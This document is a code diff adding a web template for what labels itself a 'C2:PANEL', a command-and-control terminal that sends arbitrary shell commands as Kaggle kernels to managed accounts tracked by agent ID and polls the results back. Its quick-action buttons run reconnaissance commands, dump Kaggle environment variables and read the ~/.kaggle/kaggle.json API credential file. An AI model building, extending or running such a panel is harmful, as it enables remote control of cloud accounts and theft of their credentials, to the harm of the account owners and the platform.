@@ -1,0 +1,482 @@
+{% extends "base.html" %}
+{% block title %}Kaggle — {{ kernel_slug }}{% endblock %}
+{% block page_title %}
+  <span style="font-family:var(--font-mono);font-size:13px;color:var(--text-dim)">kaggle</span>
+  <span style="color:var(--border-light);margin:0 6px">/</span>
+  <span style="color:#9b59b6">{{ kernel_slug }}</span>
+{% endblock %}
+
+{% block head %}
+<style>
+  .kc-layout {
+    display: grid;
+    grid-template-columns: 1fr 240px;
+    gap: 16px;
+    height: calc(100vh - 100px);
+  }
+  .kc-terminal {
+    display: flex; flex-direction: column;
+    background: var(--bg-card); border: 1px solid var(--border);
+    border-radius: var(--radius-lg); overflow: hidden;
+    transition: border-color 0.3s ease;
+  }
+  .kc-terminal:focus-within { border-color: rgba(155,89,182,0.5); box-shadow: 0 0 0 1px rgba(155,89,182,0.15); }
+  .kc-titlebar {
+    display: flex; align-items: center; gap: 12px;
+    padding: 10px 16px; background: rgba(0,0,0,0.25);
+    border-bottom: 1px solid var(--border); flex-shrink: 0;
+  }
+  .kc-body {
+    flex: 1; overflow-y: auto; padding: 14px 16px;
+    font-family: var(--font-mono); font-size: 12.5px; line-height: 1.8;
+    background: #000d18; white-space: pre-wrap; word-break: break-all;
+    color: #7090b0; scroll-behavior: smooth;
+    background-image: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
+  }
+  .kc-body .kc-prompt { color: #9b59b6; font-weight: 600; }
+  .kc-body .kc-output { color: #8ab4d0; }
+  .kc-body .kc-error  { color: var(--red); }
+  .kc-body .kc-info   { color: var(--yellow); opacity: 0.8; }
+  .kc-body .kc-success{ color: var(--green); }
+  .kc-body .kc-cmd-line {
+    display: block; border-left: 2px solid rgba(155,89,182,0.3);
+    padding-left: 8px; margin: 2px 0; animation: fadeIn 0.2s ease;
+  }
+  .kc-body .kc-result-block {
+    display: block; background: rgba(0,0,0,0.3); border-radius: 4px;
+    padding: 6px 10px; margin: 4px 0 8px;
+    border-left: 2px solid rgba(155,89,182,0.3);
+    animation: fadeIn 0.25s ease; position: relative;
+  }
+  .kc-result-copy {
+    position: absolute; top: 4px; right: 6px;
+    padding: 2px 7px; font-size: 9px; border-radius: 4px;
+    background: var(--bg-card); border: 1px solid var(--border);
+    color: var(--text-dim); cursor: pointer; opacity: 0; transition: opacity 0.2s;
+  }
+  .kc-result-block:hover .kc-result-copy { opacity: 1; }
+  .kc-result-copy:hover { border-color: #9b59b6; color: #9b59b6; }
+  .kc-input-row {
+    display: flex; align-items: center; padding: 0 16px;
+    border-top: 1px solid var(--border); background: rgba(0,0,0,0.2);
+    flex-shrink: 0; transition: background 0.2s ease;
+  }
+  .kc-input-row:focus-within { background: rgba(155,89,182,0.04); }
+  .kc-prompt-label {
+    font-family: var(--font-mono); font-size: 12.5px; font-weight: 600;
+    color: #9b59b6; white-space: nowrap; padding: 10px 10px 10px 0;
+    border-right: 1px solid var(--border); margin-right: 12px; flex-shrink: 0;
+    text-shadow: 0 0 10px rgba(155,89,182,0.5);
+  }
+  .kc-input {
+    flex: 1; background: transparent !important; border: none !important;
+    outline: none; color: var(--text-bright) !important;
+    font-family: var(--font-mono) !important; font-size: 12.5px;
+    padding: 10px 0; caret-color: #9b59b6; box-shadow: none !important;
+  }
+  .kc-status-bar {
+    display: flex; align-items: center; gap: 12px;
+    padding: 5px 16px; background: rgba(0,0,0,0.15);
+    border-top: 1px solid var(--border); flex-shrink: 0;
+    font-size: 10px; font-family: var(--font-mono); color: var(--text-muted);
+  }
+  .kc-status-bar .csb-item { display: flex; align-items: center; gap: 4px; }
+  .kc-sidebar { display: flex; flex-direction: column; gap: 12px; overflow-y: auto; }
+  .kc-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg); overflow: hidden; }
+  .kc-card-header { padding: 10px 14px; background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border); font-size: 10px; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
+  .kc-info-table td { padding: 5px 10px; font-size: 11px; border-bottom: 1px solid rgba(22,32,56,0.4); }
+  .kc-info-table td:first-child { color: var(--text-dim); width: 70px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .kc-info-table tr:last-child td { border-bottom: none; }
+  .kc-quick-btn {
+    background: var(--bg-input); border: 1px solid var(--border); border-radius: 5px;
+    color: var(--text-dim); font-size: 10px; font-family: var(--font-mono);
+    padding: 4px 8px; cursor: pointer; transition: all 0.18s ease;
+    text-align: left; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .kc-quick-btn:hover { background: rgba(155,89,182,0.15); border-color: rgba(155,89,182,0.5); color: #9b59b6; }
+  .kc-status-pill {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 2px 9px; border-radius: 20px; font-size: 10px; font-weight: 700;
+    letter-spacing: 0.5px; font-family: var(--font-mono);
+  }
+  .kc-status-pill.running { background: rgba(241,196,15,0.1); border: 1px solid rgba(241,196,15,0.3); color: #f1c40f; }
+  .kc-status-pill.complete { background: rgba(0,245,155,0.1); border: 1px solid rgba(0,245,155,0.3); color: var(--green); }
+  .kc-status-pill.error { background: rgba(255,61,90,0.1); border: 1px solid rgba(255,61,90,0.25); color: var(--red); }
+  .kc-status-pill.idle { background: rgba(155,89,182,0.1); border: 1px solid rgba(155,89,182,0.3); color: #9b59b6; }
+  .kc-poll-bar { height: 2px; background: var(--bg-input); border-radius: 2px; overflow: hidden; margin-top: 4px; }
+  .kc-poll-fill { height: 100%; background: linear-gradient(90deg, #9b59b6, #8e44ad); width: 0%; transition: width 0.5s linear; }
+</style>
+{% endblock %}
+
+{% block topbar_actions %}
+<div style="display:flex;align-items:center;gap:8px">
+  <span class="kc-status-pill idle" id="kernelStatusPill">
+    <span style="width:6px;height:6px;background:#9b59b6;border-radius:50%;animation:pulse 1.5s infinite"></span>
+    IDLE
+  </span>
+  <button class="btn sm" onclick="checkStatus()">⟳ Status</button>
+  <button class="btn sm" onclick="getResults()">📄 Results</button>
+  <a href="/devices" class="btn sm">← Devices</a>
+</div>
+{% endblock %}
+
+{% block content %}
+<div class="kc-layout">
+
+  <!-- LEFT: Terminal -->
+  <div class="kc-terminal">
+    <div class="kc-titlebar">
+      <div class="win-chrome">
+        <span class="win-dot red" title="Close" onclick="if(confirm('Kill kernel?'))killKernel()"></span>
+        <span class="win-dot yellow" title="Clear" onclick="clearTerm()"></span>
+        <span class="win-dot green" title="Reload" onclick="location.reload()"></span>
+      </div>
+      <div style="flex:1;display:flex;align-items:center;justify-content:center;gap:8px">
+        <span style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim)">
+          {{ kernel_slug }}
+          <span style="color:var(--text-muted);margin:0 4px">—</span>
+          kaggle kernel
+        </span>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <span style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono)" id="pollCountdown"></span>
+        <button class="btn sm ghost" onclick="clearTerm()" style="padding:2px 8px;font-size:10px">Clear</button>
+      </div>
+    </div>
+
+    <div class="kc-body" id="kcOutput">
+<span class="kc-info">╔══════════════════════════════════════════════╗
+║       C2:PANEL — KAGGLE KERNEL TERMINAL      ║
+╚══════════════════════════════════════════════╝
+</span><span class="kc-info">  Kernel  : {{ kernel_slug }}</span>
+<span class="kc-info">  Account : {{ username }}</span>
+<span class="kc-info">  Kernel# : {{ kernel_num }}</span>
+<span class="kc-info">  Agent   : {{ agent_id }}</span>
+<span class="kc-info">──────────────────────────────────────────────
+</span>
+<span class="kc-info">  Note: Commands are pushed as Kaggle kernels.
+  Execution takes 1-3 minutes. Use "⟳ Status"
+  to check progress, "📄 Results" to fetch output.
+──────────────────────────────────────────────
+</span>
+    </div>
+
+    <div class="kc-input-row">
+      <span class="kc-prompt-label">kaggle$</span>
+      <input type="text" id="kcInput" class="kc-input" placeholder="Enter command… (↑↓ history, Enter to execute)" autofocus>
+      <button class="btn sm" onclick="execCmd()" style="padding:4px 12px;font-size:11px;flex-shrink:0;margin-left:8px;background:rgba(155,89,182,0.2);border-color:rgba(155,89,182,0.5);color:#9b59b6">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:11px;height:11px"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      </button>
+    </div>
+
+    <div class="kc-status-bar">
+      <span class="csb-item">
+        <span style="width:6px;height:6px;border-radius:50%;background:#9b59b6;box-shadow:0 0 6px rgba(155,89,182,0.5);display:inline-block"></span>
+        kaggle
+      </span>
+      <span class="csb-item" style="color:#9b59b6">{{ username }}</span>
+      <span class="csb-item">kernel #{{ kernel_num }}</span>
+      <span style="margin-left:auto" class="csb-item" id="kcStatusLabel">ready</span>
+    </div>
+  </div>
+
+  <!-- RIGHT: Sidebar -->
+  <div class="kc-sidebar">
+
+    <!-- Kernel Info -->
+    <div class="kc-card">
+      <div class="kc-card-header">Kernel Info</div>
+      <table class="kc-info-table" style="width:100%">
+        <tr><td>Slug</td><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);word-break:break-all">{{ kernel_slug }}</td></tr>
+        <tr><td>Account</td><td style="font-weight:600;color:#9b59b6">{{ username }}</td></tr>
+        <tr><td>Kernel#</td><td style="font-family:var(--font-mono)">{{ kernel_num }}</td></tr>
+        <tr><td>Status</td><td id="sidebarStatus"><span style="color:var(--text-dim)">—</span></td></tr>
+        <tr><td>Last Run</td><td id="sidebarLastRun" style="color:var(--text-muted);font-size:10px">—</td></tr>
+      </table>
+    </div>
+
+    <!-- Poll Progress -->
+    <div class="kc-card" id="pollCard" style="display:none">
+      <div class="kc-card-header">Waiting for result</div>
+      <div style="padding:10px 14px">
+        <div style="font-size:10px;color:var(--text-dim);margin-bottom:6px" id="pollMsg">Kernel running...</div>
+        <div class="kc-poll-bar"><div class="kc-poll-fill" id="pollFill"></div></div>
+        <div style="font-size:9px;color:var(--text-muted);margin-top:4px;font-family:var(--font-mono)" id="pollTimer">0s</div>
+      </div>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="kc-card">
+      <div class="kc-card-header">Quick Actions</div>
+      <div style="padding:8px;display:grid;grid-template-columns:1fr 1fr;gap:4px">
+        <button class="kc-quick-btn" onclick="quickCmd('whoami && id')">whoami</button>
+        <button class="kc-quick-btn" onclick="quickCmd('hostname && uname -a')">sysinfo</button>
+        <button class="kc-quick-btn" onclick="quickCmd('nvidia-smi')">nvidia-smi</button>
+        <button class="kc-quick-btn" onclick="quickCmd('free -h')">memory</button>
+        <button class="kc-quick-btn" onclick="quickCmd('df -h')">disk</button>
+        <button class="kc-quick-btn" onclick="quickCmd('ps aux | head -15')">processes</button>
+        <button class="kc-quick-btn" onclick="quickCmd('ls -la /kaggle/working')">working dir</button>
+        <button class="kc-quick-btn" onclick="quickCmd('ls -la /kaggle/input')">input dir</button>
+        <button class="kc-quick-btn" onclick="quickCmd('cat /etc/os-release')">os info</button>
+        <button class="kc-quick-btn" onclick="quickCmd('pip list | head -20')">packages</button>
+        <button class="kc-quick-btn" onclick="quickCmd('python3 -c \"import torch;print(torch.cuda.is_available(),torch.cuda.get_device_name(0) if torch.cuda.is_available() else \\\"no gpu\\\")\"')">torch gpu</button>
+        <button class="kc-quick-btn" onclick="quickCmd('curl -s https://ipinfo.io/json | python3 -m json.tool')">ip info</button>
+      </div>
+    </div>
+
+    <!-- GPU Shortcuts -->
+    <div class="kc-card">
+      <div class="kc-card-header" style="color:#9b59b6">GPU / ML</div>
+      <div style="padding:8px;display:flex;flex-direction:column;gap:4px">
+        <button class="kc-quick-btn" onclick="quickCmd('python3 -c \"import torch;x=torch.randn(1000,1000).cuda();print(torch.mm(x,x).sum().item())\"')">torch matmul</button>
+        <button class="kc-quick-btn" onclick="quickCmd('python3 -c \"import subprocess;r=subprocess.run([\\\"nvidia-smi\\\",\\\"--query-gpu=name,memory.total,memory.used,temperature.gpu,utilization.gpu\\\",\\\"--format=csv\\\"],capture_output=True,text=True);print(r.stdout)\"')">gpu details</button>
+        <button class="kc-quick-btn" onclick="quickCmd('python3 -c \"import os,json;print(json.dumps({k:v for k,v in os.environ.items() if \\\"KAGGLE\\\" in k},indent=2))\"')">kaggle env</button>
+        <button class="kc-quick-btn" onclick="quickCmd('cat ~/.kaggle/kaggle.json 2>/dev/null || echo no kaggle.json')">kaggle.json</button>
+      </div>
+    </div>
+
+    <!-- Notes -->
+    <div class="kc-card">
+      <div class="kc-card-header">Notes</div>
+      <div style="padding:8px">
+        <textarea id="kcNote" rows="4" style="font-size:11px;resize:vertical;width:100%" placeholder="Notes about this kernel..."></textarea>
+        <button class="btn sm" style="margin-top:6px;width:100%;font-size:10px" onclick="saveNote()">Save Note</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const AGENT_ID = '{{ agent_id }}';
+const KERNEL_SLUG = '{{ kernel_slug }}';
+const output = document.getElementById('kcOutput');
+const input = document.getElementById('kcInput');
+const statusLbl = document.getElementById('kcStatusLabel');
+
+const cmdHistory = [];
+let histIdx = -1;
+let pollTimer = null;
+let pollStart = 0;
+let pollInterval = null;
+
+function appendLine(html) {
+  output.innerHTML += '\n' + html;
+  output.querySelectorAll('.kc-result-block:not([data-copy])').forEach(block => {
+    block.dataset.copy = '1';
+    const btn = document.createElement('button');
+    btn.className = 'kc-result-copy';
+    btn.textContent = 'copy';
+    btn.onclick = () => {
+      navigator.clipboard.writeText(block.textContent.replace('copy','').trim());
+      btn.textContent = '✓'; setTimeout(() => btn.textContent = 'copy', 1500);
+    };
+    block.appendChild(btn);
+  });
+  output.scrollTop = output.scrollHeight;
+}
+
+function setStatus(text, color) {
+  if (statusLbl) { statusLbl.textContent = text; statusLbl.style.color = color || ''; }
+}
+
+function updateStatusPill(status) {
+  const pill = document.getElementById('kernelStatusPill');
+  const sidebar = document.getElementById('sidebarStatus');
+  if (!pill) return;
+  const map = {
+    running: ['running', 'RUNNING', '#f1c40f'],
+    complete: ['complete', 'COMPLETE', 'var(--green)'],
+    error: ['error', 'ERROR', 'var(--red)'],
+    idle: ['idle', 'IDLE', '#9b59b6'],
+  };
+  const [cls, label, color] = map[status] || map.idle;
+  pill.className = `kc-status-pill ${cls}`;
+  pill.innerHTML = `<span style="width:6px;height:6px;background:${color};border-radius:50%;${status==='running'?'animation:pulse 1.5s infinite':''}"></span> ${label}`;
+  if (sidebar) sidebar.innerHTML = `<span style="color:${color};font-weight:600;font-size:11px">${label}</span>`;
+  document.getElementById('sidebarLastRun').textContent = new Date().toLocaleTimeString();
+}
+
+function execCmd() {
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  cmdHistory.unshift(cmd); histIdx = -1;
+  appendLine(`<span class="kc-cmd-line"><span class="kc-prompt">kaggle$</span> <span class="kc-output">${escHtml(cmd)}</span></span>`);
+  setStatus('pushing kernel…', 'var(--yellow)');
+  input.value = '';
+
+  fetch('/api/kaggle/kernel/exec', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: AGENT_ID, command: cmd})
+  }).then(r => r.json()).then(d => {
+    if (d.status === 'started') {
+      appendLine(`<span class="kc-info">  ↳ kernel pushed — waiting for execution (1-3 min)…</span>`);
+      setStatus('running', '#f1c40f');
+      updateStatusPill('running');
+      startPoll();
+    } else {
+      appendLine(`<span class="kc-error">  ✕ Error: ${escHtml(d.error || 'unknown')}</span>`);
+      setStatus('error', 'var(--red)');
+      updateStatusPill('error');
+    }
+  }).catch(e => {
+    appendLine(`<span class="kc-error">  ✕ Request failed: ${escHtml(e.message)}</span>`);
+    setStatus('error', 'var(--red)');
+  });
+}
+
+function quickCmd(cmd) { input.value = cmd; execCmd(); }
+
+function startPoll() {
+  const card = document.getElementById('pollCard');
+  const fill = document.getElementById('pollFill');
+  const msg = document.getElementById('pollMsg');
+  const timerEl = document.getElementById('pollTimer');
+  if (card) card.style.display = '';
+  pollStart = Date.now();
+  let elapsed = 0;
+  if (pollInterval) clearInterval(pollInterval);
+  pollInterval = setInterval(() => {
+    elapsed = Math.floor((Date.now() - pollStart) / 1000);
+    const pct = Math.min(95, (elapsed / 180) * 100);
+    if (fill) fill.style.width = pct + '%';
+    if (timerEl) timerEl.textContent = elapsed + 's elapsed';
+    if (msg) msg.textContent = elapsed < 30 ? 'Kernel starting...' : elapsed < 90 ? 'Kernel running...' : 'Waiting for output...';
+  }, 1000);
+  // Auto-fetch results after 90s
+  if (pollTimer) clearTimeout(pollTimer);
+  pollTimer = setTimeout(() => {
+    clearInterval(pollInterval);
+    if (fill) fill.style.width = '100%';
+    getResults(true);
+  }, 90000);
+}
+
+function stopPoll() {
+  if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+  const card = document.getElementById('pollCard');
+  if (card) card.style.display = 'none';
+}
+
+function checkStatus() {
+  appendLine(`<span class="kc-info">  ↳ checking kernel status…</span>`);
+  fetch('/api/kaggle/kernel/status', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: AGENT_ID})
+  }).then(r => r.json()).then(d => {
+    const st = d.status || 'unknown';
+    const color = st === 'complete' ? 'var(--green)' : st === 'running' ? '#f1c40f' : 'var(--red)';
+    appendLine(`<span class="kc-result-block"><span style="color:${color}">● Status: ${st}</span></span>`);
+    updateStatusPill(st === 'complete' ? 'complete' : st === 'running' ? 'running' : 'idle');
+    setStatus(st, color);
+    if (st === 'complete') stopPoll();
+  }).catch(e => appendLine(`<span class="kc-error">  ✕ Status check failed: ${escHtml(e.message)}</span>`));
+}
+
+function getResults(auto = false) {
+  if (!auto) appendLine(`<span class="kc-info">  ↳ fetching results…</span>`);
+  fetch('/api/kaggle/kernel/results', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: AGENT_ID})
+  }).then(r => r.json()).then(d => {
+    stopPoll();
+    if (d.outputs && Object.keys(d.outputs).length > 0) {
+      appendLine(`<span class="kc-success">  ↳ ${Object.keys(d.outputs).length} output file(s) received</span>`);
+      for (const [name, content] of Object.entries(d.outputs)) {
+        appendLine(`<span class="kc-info">── ${name} ──</span>`);
+        appendLine(`<span class="kc-result-block">${escHtml(content.slice(0, 4000))}${content.length > 4000 ? '\n… (truncated)' : ''}</span>`);
+      }
+      updateStatusPill('complete');
+      setStatus('complete', 'var(--green)');
+    } else {
+      appendLine(`<span class="kc-info">  ↳ No outputs yet — kernel may still be running</span>`);
+    }
+  }).catch(e => appendLine(`<span class="kc-error">  ✕ Results fetch failed: ${escHtml(e.message)}</span>`));
+}
+
+function killKernel() {
+  appendLine(`<span class="kc-error">  ↳ sending stop signal…</span>`);
+  fetch('/api/kaggle/kernel/exec', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({kernel_id: AGENT_ID, command: 'echo stopping'})
+  }).then(() => { stopPoll(); updateStatusPill('idle'); setStatus('stopped', 'var(--red)'); });
+}
+
+function clearTerm() {
+  output.innerHTML = `<span class="kc-info">  Console cleared — ${new Date().toLocaleTimeString()}</span>`;
+}
+
+function escHtml(t) {
+  if (!t) return '';
+  return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function saveNote() {
+  const note = document.getElementById('kcNote').value;
+  localStorage.setItem('kc_note_' + AGENT_ID, note);
+  showNotification('Note saved', 'green');
+}
+
+// Load saved note
+const savedNote = localStorage.getItem('kc_note_' + AGENT_ID);
+if (savedNote) document.getElementById('kcNote').value = savedNote;
+
+// Keyboard navigation
+input.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && input.value.trim()) { execCmd(); return; }
+  if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (histIdx < cmdHistory.length - 1) { histIdx++; input.value = cmdHistory[histIdx]; }
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (histIdx > 0) { histIdx--; input.value = cmdHistory[histIdx]; }
+    else if (histIdx === 0) { histIdx = -1; input.value = ''; }
+  }
+});
+
+// Initial status check
+checkStatus();
+
+// Auto-poll: если kernel running — проверяем статус адаптивно
+let _autoStatusTimer = null;
+let _autoStatusInterval = 45000;
+
+function startAutoStatus() {
+  if (_autoStatusTimer) clearInterval(_autoStatusTimer);
+  _autoStatusTimer = setInterval(() => {
+    fetch('/api/kaggle/kernel/status', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({kernel_id: AGENT_ID})
+    }).then(r => r.json()).then(d => {
+      const st = d.status || 'unknown';
+      updateStatusPill(st === 'complete' ? 'complete' : st === 'running' ? 'running' : 'idle');
+      if (st === 'complete') {
+        stopPoll();
+        clearInterval(_autoStatusTimer); _autoStatusTimer = null;
+        appendLine(`<span class="kc-success">  ✓ Kernel finished — fetching results…</span>`);
+        getResults(true);
+      } else if (st === 'running') {
+        // Speed up polling when running
+        _autoStatusInterval = 20000;
+        clearInterval(_autoStatusTimer);
+        startAutoStatus();
+      }
+    }).catch(() => {});
+  }, _autoStatusInterval);
+}
+startAutoStatus();
+
+// Ctrl+Enter — exec
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') { e.preventDefault(); execCmd(); }
+});
+
+// Ctrl+L — clear
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'l') { e.preventDefault(); clearTerm(); }
+});
+</script>
+{% endblock %}
